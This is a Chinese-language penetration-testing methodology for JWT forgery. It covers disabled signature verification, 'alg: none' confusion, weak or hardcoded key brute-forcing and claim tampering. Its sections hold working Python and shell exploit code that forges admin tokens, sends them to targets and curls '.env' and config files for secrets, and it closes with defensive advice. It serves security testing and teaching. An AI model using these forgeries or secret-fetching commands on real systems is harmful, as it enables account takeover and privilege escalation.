# JWT 令牌伪造攻击方法论

## 第一部分：文档概述

### 1.1 编写目的
本方法论文档旨在为渗透测试人员提供一套标准化、可复现的 JWT 令牌伪造攻击流程，针对 JWT 签名验证缺陷、弱密钥、算法混淆等常见漏洞进行系统性测试与利用，确保测试的深度和广度，提高漏洞发现的准确率和效率。

### 1.2 适用范围
本文档适用于以下场景：
- JWT 签名验证被禁用或绕过
- JWT 使用弱密钥或硬编码密钥
- JWT 算法可被篡改（如 HS256→none）
- JWT 令牌无过期时间（exp claim 缺失）
- JWT 令牌未与服务器端会话绑定
- 混合 JWT+Session 认证架构

### 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师，以及负责代码审计的开发人员。

---

## 第二部分：核心渗透技术专题

### 专题一：JWT 签名验证禁用攻击

#### 2.1.1 技术介绍
JWT 签名验证禁用是指应用程序在解码 JWT 令牌时显式关闭签名验证逻辑，导致攻击者可以伪造任意 JWT 令牌而无需知道正确的签名密钥。

**漏洞本质：** 应用程序信任客户端提供的 JWT 声明（claims），未通过密码学手段验证令牌的完整性和真实性。

**典型代码特征：**
```python
# Python PyJWT - 显式禁用签名验证
data = jwt.decode(token, key, algorithms=['HS256'], 
    options={'verify_signature': False})  # 漏洞点

# 或完全跳过密钥验证
data = jwt.decode(token, options={"verify_signature": False})
```

#### 2.1.2 攻击常见业务场景
| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 用户认证系统 | 登录后的用户身份识别 | JWT user_id 可被篡改访问任意账户 |
| 权限管理系统 | 基于 JWT claims 的权限判断 | role/permissions 字段可被提升 |
| API 网关认证 | 微服务间 JWT 令牌传递 | 伪造令牌访问内部服务 |
| SSO 单点登录 | 跨应用身份传递 | 伪造身份访问关联系统 |
| CTF 挑战应用 | 认证绕过获取 flag | 访问特权用户数据 |

#### 2.1.3 漏洞探测方法

**黑盒测试：**

1. **JWT 结构分析**
   ```bash
   # 使用 jq 解码 JWT payload（无需密钥）
   echo "<JWT_TOKEN>" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .
   
   # 或使用在线工具 jwt.io 解码
   ```

2. **签名验证测试**
   ```python
   import jwt
   
   # 步骤 1：获取合法 JWT 令牌
   original_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
   
   # 步骤 2：修改 payload 中的关键字段（如 user_id）
   decoded = jwt.decode(original_token, options={"verify_signature": False})
   decoded['user_id'] = 10019  # 修改为目标用户 ID
   
   # 步骤 3：使用任意密钥重新签名
   forged_token = jwt.encode(decoded, "any_secret", algorithm="HS256")
   
   # 步骤 4：使用伪造令牌访问受保护资源
   response = requests.get("http://target/dashboard", 
       cookies={"auth_token": forged_token})
   
   # 如果访问成功，说明签名验证被禁用
   ```

3. **算法混淆测试（Algorithm Confusion）**
   ```python
   import jwt
   import base64
   
   # 方法 1：将算法改为"none"
   header = {"alg": "none", "typ": "JWT"}
   payload = {"user_id": 10019, "role": "admin"}
   
   header_b64 = base64.urlsafe_b64encode(
       json.dumps(header).encode()).decode().rstrip('=')
   payload_b64 = base64.urlsafe_b64encode(
       json.dumps(payload).encode()).decode().rstrip('=')
   
   none_jwt = f"{header_b64}.{payload_b64}."
   ```

**白盒测试：**

1. **代码审计关键词搜索**
   ```bash
   # 搜索 JWT 解码相关代码
   grep -rn "jwt.decode" --include="*.py"
   grep -rn "JWT::decode" --include="*.rb"
   grep -rn "JWT.verify" --include="*.java"
   
   # 搜索签名验证禁用模式
   grep -rn "verify_signature.*False" --include="*.py"
   grep -rn "options.*verify" --include="*.py"
   ```

2. **配置审计**
   - 检查 JWT 库的初始化配置
   - 检查是否存在全局禁用验证的设置
   - 检查密钥管理方式（硬编码/配置文件）

#### 2.1.4 漏洞利用方法

**基础利用 - 水平权限提升：**

```python
import jwt

# 1. 获取合法令牌（通过正常登录）
# 假设登录后获得：eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMn0.xxx

# 2. 解码并修改 payload
payload = {
    "username": "test",
    "user_id": 10019,  # 修改为 flag 用户 ID
    "user_type": "customer"
}

# 3. 使用任意密钥重新签名（因为验证被禁用）
forged_token = jwt.encode(payload, "wrong_secret", algorithm="HS256")

# 4. 访问目标端点
import requests
response = requests.get("http://localhost:44191/dashboard",
    cookies={"auth_token": forged_token,
             "session": "eyJ1c2VyX2lkIjoxMDAzMn0.xxx"})

# 5. 提取敏感数据
print(response.text)  # 包含 flag 用户的 last_name 字段
```

**进阶利用 - 垂直权限提升：**

```python
# 如果应用使用 JWT claims 进行权限判断
payload = {
    "user_id": 10032,
    "username": "test",
    "role": "admin",        # 提升权限
    "permissions": ["*"],   # 获取所有权限
    "is_admin": True        # 管理员标志
}

forged_token = jwt.encode(payload, "any_key", algorithm="HS256")
```

**组合攻击 - JWT+Session 混合认证绕过：**

```python
# 当应用同时检查 Session 和 JWT 时
# 1. 先建立合法 Session
session = requests.Session()
session.post("http://target/login", data={"user": "test", "pass": "test"})

# 2. 伪造 JWT 令牌
forged_jwt = jwt.encode({"user_id": 10019}, "any", algorithm="HS256")

# 3. 同时使用合法 Session+伪造 JWT
session.cookies.set("auth_token", forged_jwt)
response = session.get("http://target/admin/dashboard")
```

#### 2.1.5 漏洞利用绕过方法

**绕过 JWT 库验证：**

| 绕过技巧 | Payload 示例 | 适用场景 |
|---------|-------------|---------|
| 算法设为 none | `{"alg":"none","typ":"JWT"}` | 库未校验算法白名单 |
| 大小写混淆 | `{"alg":"None","typ":"JWT"}` | 字符串比较未规范化 |
| 空格填充 | `{"alg":"none ","typ":"JWT"}` | 未 trim 处理 |
| 空签名 | `header.payload.` (末尾无签名) | 未检查签名长度 |

**绕过密钥验证：**

```python
# 如果应用尝试多个密钥
# 方法：使用常见弱密钥字典进行签名
weak_keys = [
    "secret", "password", "123456", 
    "your_secret_key", "jwt_secret",
    "this_is_the_secret_key_for_the_json_token"
]

for key in weak_keys:
    token = jwt.encode(payload, key, algorithm="HS256")
    # 测试哪个密钥有效
```

---

### 专题二：硬编码 JWT 密钥攻击

#### 2.2.1 技术介绍
硬编码 JWT 密钥是指签名密钥被直接写入源代码、配置文件或环境变量中，导致攻击者一旦获取密钥即可伪造任意 JWT 令牌。

**常见硬编码位置：**
- 源代码中的字符串字面量
- 配置文件（config.py, settings.py, .env）
- Docker 环境变量
- Git 历史记录

#### 2.2.2 密钥发现方法

**源码审计：**
```bash
# 搜索常见 JWT 密钥变量名
grep -rn "JWT_SECRET\|AUTH_SECRET_KEY\|jwt.*key\|signing.*key" --include="*.py"

# 搜索硬编码字符串模式
grep -rn "['\"].*_secret.*['\"]" --include="*.py"
grep -rn "['\"].*_key.*['\"]" --include="*.py"
```

**配置泄露利用：**
```bash
# 检查常见配置文件
curl http://target/.env
curl http://target/config.py
curl http://target/settings.json

# Git 历史泄露
git log --all --full-history -- "**/*secret*"
```

#### 2.2.3 密钥爆破攻击

```python
import jwt
import requests

target_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
payload = {"user_id": 10019, "role": "admin"}

# 弱密钥字典
weak_keys = [
    "secret", "key", "jwt_secret", "auth_key",
    "your_secret_key", "change_this_secret",
    "this_is_the_secret_key_for_the_json_token",
    "trading_platform_jwt_secret"
]

for secret in weak_keys:
    try:
        # 尝试用该密钥解码
        decoded = jwt.decode(target_jwt, secret, algorithms=["HS256"])
        print(f"[+] Found valid key: {secret}")
        print(f"[+] Decoded payload: {decoded}")
        
        # 伪造新令牌
        forged = jwt.encode(payload, secret, algorithm="HS256")
        print(f"[+] Forged token: {forged}")
        break
    except jwt.InvalidSignatureError:
        continue
```

---

### 专题三：JWT 声明（Claims）篡改攻击

#### 2.3.1 可篡改的常见 Claims

| Claim 字段 | 用途 | 篡改影响 |
|-----------|------|---------|
| `user_id` | 用户唯一标识 | 水平权限提升（IDOR） |
| `username` | 用户名 | 身份冒充 |
| `role` / `roles` | 用户角色 | 垂直权限提升 |
| `permissions` | 权限列表 | 获取未授权权限 |
| `is_admin` | 管理员标志 | 获取管理员权限 |
| `exp` | 过期时间 | 延长令牌有效期 |
| `iat` | 签发时间 | 绕过时间检查 |
| `iss` | 签发者 | 冒充合法签发方 |
| `aud` | 受众 | 绕过受众检查 |
| `sub` | 主题 | 身份混淆 |

#### 2.3.2 篡改利用示例

```python
import jwt

# 原始令牌 payload
original = {
    "user_id": 10032,
    "username": "test",
    "role": "user",
    "exp": 1234567890
}

# 篡改后的 payload
tampered = {
    "user_id": 1,           # 改为 admin 用户 ID
    "username": "admin",    # 改为 admin 用户名
    "role": "administrator",# 提升角色
    "permissions": ["*"],   # 获取所有权限
    "is_admin": True,       # 设置管理员标志
    "exp": 9999999999       # 延长过期时间
}

# 如果密钥已知或验证被禁用
forged = jwt.encode(tampered, "known_secret", algorithm="HS256")
```

---

## 第三部分：附录

### 3.1 常用 Payload 速查表

| 攻击目标 | Payload 示例 | 说明 |
|---------|-------------|------|
| 算法 none 攻击 | `{"alg":"none","typ":"JWT"}` | 完全跳过签名验证 |
| 用户 ID 篡改 | `{"user_id": 1}` | 访问 ID=1 的用户账户 |
| 角色提升 | `{"role": "admin"}` | 获取管理员权限 |
| 权限扩展 | `{"permissions": ["*"]}` | 获取所有权限 |
| 永不过期 | `{"exp": 9999999999}` | 设置极远的过期时间 |
| 签发者冒充 | `{"iss": "trusted_issuer"}` | 冒充可信签发方 |

### 3.2 JWT 攻击工具

**在线工具：**
- jwt.io - JWT 解码/编码/验证
- jwt.ms - Microsoft JWT 分析工具
- hackvertor.co.uk - JWT 攻击插件

**命令行工具：**
```bash
# jwt-tool - JWT 攻击瑞士军刀
pip install jwt-tool
jwt-tool <token> -C a  # 算法混淆攻击
jwt-tool <token> -S p  # 密钥爆破

# jq - JWT 解码
echo <token> | cut -d'.' -f2 | base64 -d | jq .
```

**Python 库：**
```python
import jwt  # PyJWT - JWT 编解码
import jwt_tool  # jwt-tool 库
```

### 3.3 防御建议

1. **始终验证签名**
   ```python
   # 正确做法
   data = jwt.decode(token, secret_key, algorithms=["HS256"])
   
   # 错误做法（禁止使用）
   data = jwt.decode(token, options={"verify_signature": False})
   ```

2. **使用强密钥**
   - 至少 256 位随机密钥
   - 使用密码学安全的随机数生成器
   - 定期轮换密钥

3. **设置合理的过期时间**
   ```python
   import datetime
   payload = {
       "user_id": 123,
       "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)
   }
   ```

4. **实施令牌吊销机制**
   - 维护吊销列表（黑名单）
   - 使用短期令牌 + 刷新令牌机制
   - 登出时使令牌失效

5. **绑定服务器端会话**
   - JWT 与 Session ID 关联
   - 验证 JWT 时检查会话状态
   - 关键操作要求重新认证

---

## 参考资源

- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [PortSwigger - JWT Attacks](https://portswigger.net/web-security/jwt)
- [jwt.io - JWT 调试工具](https://jwt.io/)
- [ticarpi/jwt_tool - JWT 攻击工具](https://github.com/ticarpi/jwt_tool)
